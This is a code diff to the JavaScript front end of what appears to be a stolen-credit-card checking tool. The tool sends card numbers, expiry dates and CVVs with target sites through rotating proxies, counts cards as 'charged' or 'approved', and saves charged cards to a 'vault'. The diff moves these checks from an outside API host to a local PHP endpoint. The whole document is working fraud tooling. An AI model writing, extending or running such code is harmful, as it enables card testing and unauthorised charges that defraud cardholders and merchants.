@@ -592,10 +592,21 @@
 
             for (const proxy of proxyList) {
                 try {
-                    const response = await fetch('https://api.legendbl.tech/autog.php?site=' + encodeURIComponent(sites[0] || 'https://google.com') + '&proxy=' + encodeURIComponent(proxy));
-                    const result = await response.text();
+                    // Use PHP proxy instead of direct API call
+                    const response = await fetch('bulk-api.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'validate_proxy',
+                            proxy: proxy,
+                            site: sites[0] || 'https://google.com'
+                        })
+                    });
                     
-                    const isLive = result.toLowerCase().includes('success') || !result.toLowerCase().includes('error') && !result.toLowerCase().includes('failed');
+                    const data = await response.json();
+                    const isLive = data.success && data.is_live;
                     
                     const statusBadge = document.createElement('div');
                     statusBadge.className = isLive ? 'proxy-status live' : 'proxy-status dead';
@@ -609,7 +620,7 @@
                     statusBadge.className = 'proxy-status dead';
                     statusBadge.innerHTML = `
                         <i class="fas fa-circle"></i>
-                        ${proxy.substring(0, 30)}... - ERROR
+                        ${proxy.substring(0, 30)}... - ERROR: ${error.message}
                     `;
                     statusDiv.appendChild(statusBadge);
                 }
@@ -664,24 +675,41 @@
                 const site = sites[index % sites.length];
                 const proxy = ownerProxy || (proxies.length > 0 ? proxies[index % proxies.length] : '');
 
-                const apiUrl = `https://api.legendbl.tech/autossh.php?cc=${cc}|${mes}|${ano}|${cvv}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+                // Use PHP proxy instead of direct API call
+                const response = await fetch('bulk-api.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'check_card',
+                        cc: cc,
+                        mes: mes,
+                        ano: ano,
+                        cvv: cvv,
+                        site: site,
+                        proxy: proxy
+                    })
+                });
 
-                const response = await fetch(apiUrl);
-                const result = await response.text();
+                const data = await response.json();
+                
+                if (!data.success) {
+                    throw new Error(data.error || 'Check failed');
+                }
+
+                const result = data.result;
+                const rawResponse = data.raw_response || result.message;
 
                 // Parse result
-                let status = 'declined';
-                let resultClass = 'declined';
+                let status = result.status || 'declined';
+                let resultClass = status;
 
-                if (result.toLowerCase().includes('charged')) {
-                    status = 'charged';
-                    resultClass = 'charged';
+                if (status === 'charged') {
                     stats.charged++;
                     // Save to vault
                     await saveToVault(cardData, site);
-                } else if (result.toLowerCase().includes('approved') || result.toLowerCase().includes('live') || result.toLowerCase().includes('cvv')) {
-                    status = 'approved';
-                    resultClass = 'approved';
+                } else if (status === 'approved') {
                     stats.approved++;
                 } else {
                     stats.declined++;
@@ -691,10 +719,13 @@
                 updateStats();
 
                 // Display result
-                displayResult(cardData, status, result, site, resultClass);
+                displayResult(cardData, status, rawResponse, site, resultClass);
 
             } catch (error) {
                 console.error('Error checking card:', error);
+                stats.total++;
+                stats.declined++;
+                updateStats();
                 displayResult(cardData, 'error', error.message, '', 'error');
             }
         }
